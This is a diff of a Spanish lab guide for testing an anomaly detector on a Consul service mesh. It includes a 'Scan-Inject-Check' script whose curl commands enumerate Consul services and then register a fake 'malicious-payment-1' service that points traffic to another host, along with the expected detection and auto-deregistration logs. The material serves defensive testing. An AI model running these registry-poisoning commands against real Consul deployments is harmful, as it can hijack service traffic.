@@ -13,6 +13,11 @@
 | EC2-Consul | 10.1.11.40 | `consul_service` |
 | EC2-ADS | 10.1.12.10 | `ads_server` |
 
+## ⚡ Cambios Recientes
+
+- **Buffer threshold reducido a 3**: Ahora detecta patrones con solo 6 conexiones (1 ciclo de ataque)
+- **Detección más rápida**: No necesita acumular 60+ conexiones
+
 ---
 
 ## 📋 PASO 1: Verificar Estado Inicial
@@ -58,45 +63,31 @@ consul        Up X minutes (healthy)
 ssh ads_server
 ```
 
-### 2.2 Ejecutar el ataque Scan-Inject-Check
+### 2.2 Ejecutar el ataque Scan-Inject-Check (1 ciclo = 6 conexiones)
 ```bash
-# ============================================
-# FASE 1: SCAN - Reconocimiento
-# ============================================
-echo "=== FASE 1: SCAN - Reconocimiento de servicios ==="
-for i in $(seq 1 10); do
-  curl -sk https://10.1.11.40:8501/v1/catalog/services > /dev/null
-  curl -sk https://10.1.11.40:8501/v1/catalog/nodes > /dev/null
-  curl -sk https://10.1.11.40:8501/v1/agent/services > /dev/null
-done
-echo "✓ Scan completado - 30 peticiones"
+CONSUL_IP="10.1.11.40"
 
-# ============================================
-# FASE 2: INJECT - Inyección de servicio malicioso
-# ============================================
-echo ""
-echo "=== FASE 2: INJECT - Registrando servicio falso ==="
-curl -sk -X PUT https://10.1.11.40:8501/v1/agent/service/register \
+echo "=== SCAN-INJECT-CHECK (1 ciclo = 6 conexiones) ==="
+
+# RECON (4 GETs de reconocimiento)
+echo "[RECON] Escaneando servicios..."
+curl -sk https://$CONSUL_IP:8501/v1/catalog/services > /dev/null
+curl -sk https://$CONSUL_IP:8501/v1/catalog/service/rds > /dev/null
+curl -sk https://$CONSUL_IP:8501/v1/agent/services > /dev/null
+curl -sk https://$CONSUL_IP:8501/v1/health/service/rds > /dev/null
+
+# INJECT (1 PUT - inyección de servicio malicioso)
+echo "[INJECT] Registrando servicio malicioso..."
+curl -sk -X PUT https://$CONSUL_IP:8501/v1/agent/service/register \
   -H "Content-Type: application/json" \
-  -d '{
-    "ID": "malicious-payment-1",
-    "Name": "payment",
-    "Address": "10.1.12.10",
-    "Port": 9999,
-    "Tags": ["malicious", "fake"]
-  }'
-echo "✓ Servicio malicioso 'malicious-payment-1' inyectado"
+  -d '{"Name": "malicious", "ID": "malicious-payment-1", "Port": 9999, "Address": "10.1.12.10"}'
 
-# ============================================
-# FASE 3: CHECK - Verificación
-# ============================================
-echo ""
-echo "=== FASE 3: CHECK - Verificando inyección ==="
-for i in $(seq 1 15); do
-  curl -sk https://10.1.11.40:8501/v1/catalog/service/payment > /dev/null
-  curl -sk https://10.1.11.40:8501/v1/health/service/payment > /dev/null
-done
-echo "✓ Check completado - 30 peticiones"
+# VERIFY (1 GET - verificación)
+echo "[VERIFY] Verificando inyección..."
+curl -sk https://$CONSUL_IP:8501/v1/catalog/service/malicious > /dev/null
+
+echo "=== ATAQUE COMPLETADO: 6 conexiones ==="
+```
 
 echo ""
 echo "🔴 ATAQUE COMPLETADO"
@@ -119,22 +110,21 @@ curl -sk https://10.1.11.40:8501/v1/catalog/service/payment | jq
 docker exec zeek cat /opt/zeek/logs/conn.log | grep -v "^#" | wc -l
 ```
 
-**Resultado:** Debería mostrar ~60+ conexiones capturadas
+**Resultado:** Debería mostrar ~6+ conexiones capturadas
 
 ### 3.2 Ver logs del Merger (detección en tiempo real)
 ```bash
-docker logs merger --tail 50 2>&1 | grep -E "ATAQUE|WINDOW|Generadas|predict|DEREGISTER"
+docker logs merger --tail 30 2>&1 | grep -E "ATAQUE|WINDOW|Buffer|DEREGISTER|Desregistr"
 ```
 
 **Resultado esperado:**
 ```
-📊 WINDOW - IP: 10.1.12.10, conns: 61, burst: 0.000
-HTTP Request: POST http://10.1.12.10:8083/predict "HTTP/1.1 200 OK"
-⚠️  ATAQUE DETECTADO desde IP None: 0.9999999999999999
+🔔 Buffer tiene 6 >= 3, procesando ventanas...
+📊 WINDOW - IP: 10.1.12.10, conns: 6, burst: 0.000, attack_score: 0.000
+⚠️  ATAQUE DETECTADO desde IP None: 0.8
 🚨 DEREGISTER REQUEST: Desregistrando servicios de IP 10.1.12.10
 🗑️ Desregistrando servicio: malicious-payment-1 (IP: 10.1.12.10)
 ✅ Servicio malicious-payment-1 desregistrado correctamente
-🎯 RESULTADO: 1 servicios desregistrados de IP 10.1.12.10
 ```
 
 ### 3.3 Ver logs del ADS Server (en EC2-ADS)
@@ -228,6 +218,7 @@ cd ~/app && docker compose restart merger
 
 | Parámetro | Valor | Descripción |
 |-----------|-------|-------------|
+| `WINDOW_PROCESSING_THRESHOLD` | 3 | Buffer mínimo para procesar |
 | `ATTACK_THRESHOLD` | 0.5 | Umbral para clasificar como ataque |
 | `AUTO_DEREGISTER_THRESHOLD` | 0.75 | Confianza mínima para auto-deregister |
 | `WINDOW_SIZE` | 30s | Tamaño de ventana de análisis |
